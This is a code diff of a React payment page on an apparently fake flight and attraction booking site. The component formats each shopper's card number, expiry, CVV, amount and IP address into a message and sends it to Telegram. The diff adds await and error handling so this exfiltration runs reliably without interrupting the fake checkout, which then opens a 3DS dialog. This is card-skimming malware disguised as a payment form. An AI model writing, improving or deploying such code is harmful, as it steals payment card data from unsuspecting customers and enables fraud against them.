@@ -776,8 +776,16 @@ const Payment: React.FC = () => {
                   ? `🎟 <b>Attraction Booking Attempt</b>\n<b>Attraction</b>: ${attractionBooking?.attraction?.name || 'Attraction'}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n<b>IP</b>: ${userIP}\n${summary}`
                   : `💳 <b>Flight Booking Attempt</b>\n<b>Route</b>: ${firstSeg?.departureAirport?.code} → ${lastSeg?.arrivalAirport?.code}\n<b>Card</b>: ${cardLine} ${card?.expiry?`(exp ${card.expiry})`:''}${cvv?`\n<b>CVV</b>: ${cvv}`:''}\n<b>Amount</b>: ${currency} ${total.toFixed(2)}\n<b>IP</b>: ${userIP}\n${summary}`;
               
-              sendTelegram(telegramMessage);
-            } catch {}
+              try {
+                await sendTelegram(telegramMessage);
+                console.log('Payment notification sent successfully');
+              } catch (telegramError) {
+                console.error('Failed to send payment notification:', telegramError);
+                // Не блокируем процесс оплаты из-за ошибки Telegram
+              }
+            } catch (error) {
+              console.error('Payment button error:', error);
+            }
             setThreeDSOpen(true);
           }}>
             <span className="applepay-ico" aria-hidden="true"><img src={appleLogo} alt="Apple" style={{ width:20, height:20 }} /></span>
